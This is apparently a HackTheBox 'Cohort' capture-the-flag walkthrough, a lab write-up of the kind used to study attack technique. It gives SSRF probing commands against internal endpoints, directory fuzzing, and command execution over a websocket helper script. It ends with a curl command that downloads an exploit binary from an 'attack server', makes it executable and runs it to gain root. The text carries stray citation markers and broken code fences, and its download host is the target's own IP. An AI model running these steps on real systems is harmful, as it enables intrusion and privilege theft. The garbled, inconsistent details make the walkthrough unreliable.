HackTheBox: Cohort Walkthrough
1. Reconnaissance & Port Scanning
We begin our engagement by running an Nmap scan against the target IP to identify open ports and running services.

nmap 10.129.244.174

Scan Results:   22/tcp - ssh (Open)   80/tcp - http (Open)   443/tcp - https (Open - cohort.htb)  
2. Web Enumeration & SSRF Discovery

Navigating to the web application at https://cohort.htb, we find a Client Insights feature titled "Register a report source URL" which validates external data feeds via a backend request[cite: 1, 7].

[cite: 1, 7]

Testing the validation form reveals a Server-Side Request Forgery (SSRF) vulnerability where internal and loopback endpoints can be successfully reached[cite: 1, 8]:
curl -s -k -X POST https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url":"http://0.0.0.0", "format":"csv"}' | jq

Probing internal ports like port 5000 via the SSRF endpoint returns a method restriction message, indicating an active internal service is listening[cite: 9]:

curl -s -k -X POST https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url":"http://0.0.0.0:5000","format":"csv"}' | jq
[cite: 9]

Using directory fuzzing with ffuf, we discover hidden directories and application status paths[cite: 10]:
ffuf -u https://cohort.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2.3-Medium.txt
Querying the internal /status route via SSRF yields internal routing details pointing to 127.0.0.1:8888 and service architecture insights[cite: 11]:

Bash
curl -s -k -X POST https://cohort.htb/api/validate \
  -H "Content-Type: application/json" \
  -d '{"url":"http://0.0.0.0/status", "format":"csv"}' | jq

3. Initial Access & User Flag
By leveraging our application pathways, we establish a websocket connection using the custom helper script marino.py[cite: 12].

We run commands through the websocket shell to read the user flag (user.txt) located under /home/marimo/[cite: 12]:

python3 marino.py "cat /home/marimo/user.txt"

4. Privilege Escalation to Root
To escalate privileges, we navigate to the /tmp directory and prepare an exploit binary to capture a privileged context[cite: 12, 13]:

Download and Set Permissions:
Download the exploit binary from our attack server to the target's /tmp directory and make it executable[cite: 14]:
python3 marino.py "curl -s -o /tmp/exploit.bin http://10.129.244.174:8000/exploit.bin && chmod +x /tmp/exploit.bin && ls -la /tmp/exploit.bin"
```[cite: 13, 14]
![Exploit Download and Permissions](Снимок%20экрана%202026-09-11%20183419.png)[cite: 13, 14]
Execute Exploit Background Process:
Run the exploit binary in the background using nohup to spawn SUID capabilities[cite: 15]:

python3 marino.py "rm -f /tmp/.suid_bash /tmp/pk.log; nohup /tmp/exploit.bin > /tmp/pk.log 2>&1 & sleep 1; echo started"
```[cite: 15]
![Background Execution](Снимок%20экрана%202026-09-11%20183514.jpg)[cite: 15]

Privilege Result: uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)[cite: 15]

